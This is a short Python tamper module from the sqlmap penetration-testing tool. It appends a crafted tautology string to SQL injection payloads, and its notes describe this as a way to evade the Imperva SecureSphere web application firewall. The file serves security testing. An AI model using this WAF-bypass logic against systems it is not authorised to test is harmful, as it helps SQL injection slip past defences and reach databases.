#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Appends special crafted string

    Example:
        * Input: AND 1=1
        * Output: AND 1=1 and '0having'='0having'

    Notes:
        * Useful for bypassing Imperva SecureSphere WAF
        * Reference: http://seclists.org/fulldisclosure/2011/May/163
    """

    return payload + " and '0having'='0having'" if payload else payload
